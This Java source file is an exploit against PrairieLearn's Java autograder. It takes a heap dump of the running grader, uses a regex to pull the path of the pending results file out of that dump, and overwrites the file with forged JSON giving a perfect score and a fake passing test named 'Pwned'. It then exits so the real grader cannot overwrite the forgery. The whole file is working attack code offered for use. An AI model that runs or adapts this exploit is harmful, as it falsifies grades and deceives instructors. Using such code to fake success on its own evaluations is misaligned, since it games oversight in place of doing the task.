package ca.ubc.cs317.dict.exploit;

import com.sun.management.HotSpotDiagnosticMXBean;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import javax.management.MBeanServer;
import java.io.FileReader;
import java.io.FileWriter;
import java.lang.management.ManagementFactory;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// exploit for https://github.com/PrairieLearn/PrairieLearn/tree/master/graders/java
public class PrairieLearnExploitV2 {
    private String tmpPath = "";
    private String secret = "";
    private static final String HOTSPOT_BEAN_NAME =
            "com.sun.management:type=HotSpotDiagnostic";

    // field to store the hotspot diagnostic MBean
    private static volatile HotSpotDiagnosticMXBean hotspotMBean;

    static void dumpHeap(String fileName, boolean live) {
        // initialize hotspot diagnostic MBean
        initHotspotMBean();
        try {
            hotspotMBean.dumpHeap(fileName, live);
        } catch (RuntimeException re) {
            throw re;
        } catch (Exception exp) {
            throw new RuntimeException(exp);
        }
    }

    // initialize the hotspot diagnostic MBean field
    private static void initHotspotMBean() {
        if (hotspotMBean == null) {
            synchronized (PrairieLearnExploitV2.class) {
                if (hotspotMBean == null) {
                    hotspotMBean = getHotspotMBean();
                }
            }
        }
    }

    // get the hotspot diagnostic MBean from the
    // platform MBean server
    private static HotSpotDiagnosticMXBean getHotspotMBean() {
        try {
            MBeanServer server = ManagementFactory.getPlatformMBeanServer();
            HotSpotDiagnosticMXBean bean =
                    ManagementFactory.newPlatformMXBeanProxy(server,
                            HOTSPOT_BEAN_NAME, HotSpotDiagnosticMXBean.class);
            return bean;
        } catch (RuntimeException re) {
            throw re;
        } catch (Exception exp) {
            throw new RuntimeException(exp);
        }
    }

    public static void pwnV2(){
        String dumpPath = "/grade/params/heap.hprof";
        Pattern signaturePattern = Pattern.compile("(?:[A-Za-z0-9+\\/]{4}){10}[A-Za-z0-9+\\/]{3}=");
        Pattern tmpResultPattern = Pattern.compile("/grade/results/[^/]*/\\d+.json");
        String tmpResultPath = "";
        Matcher match;
        try {
            dumpHeap(dumpPath, true);
            Scanner scnr = new Scanner(new FileReader(dumpPath));
            while (scnr.hasNext()) {
                match = tmpResultPattern.matcher(scnr.next());
                if (match.find() && !match.group(0).equals("/grade/results/[^/]*/\\d+.json")) {
                    tmpResultPath = match.group(0);
                }
            }
        }catch (Exception e) {
            // failed to create heap dump
            System.exit(0);
        }
        JSONObject fake_test = newTest("Pwned",tmpResultPath,
                16,16,"QAQ","OvO");
        JSONObject results = newResult(1,16,16,
                "PrairieLearn Java Autograder Exploit","heap dump method",
                true,fake_test);
        try (FileWriter writer = new FileWriter(tmpResultPath)) {
            writer.write(results.toString());
        } catch (Exception e) {
            // failed to write;
            System.exit(0);
        }
        // exit to prevent overwrite
        System.exit(0);
    }

    public static JSONObject newTest(String name, String description,
                                   double points, double maxPoints,
                                   String output, String message) {
        JSONObject object = new JSONObject();
        object.put("name", name);
        object.put("description", description);
        object.put("points", points);
        object.put("max_points", maxPoints);
        object.put("output", output);
        object.put("message", message);
        return object;
    }

    public static JSONObject newResult(double score, double points,double maxPoints,
                                       String output,String message, boolean gradable,
                                       JSONObject ...tests) {
        JSONObject results = new JSONObject();
        // score 0-1
        results.put("score", score);
        results.put("points",points);
        results.put("max_points", maxPoints);
        results.put("output", output);
        results.put("message", message);
        results.put("gradable",gradable);
        JSONArray resultsTests = new JSONArray();
        for (JSONObject obj : tests) {
            resultsTests.add(obj);
        }
        results.put("tests", resultsTests);
        return results;
    }
}
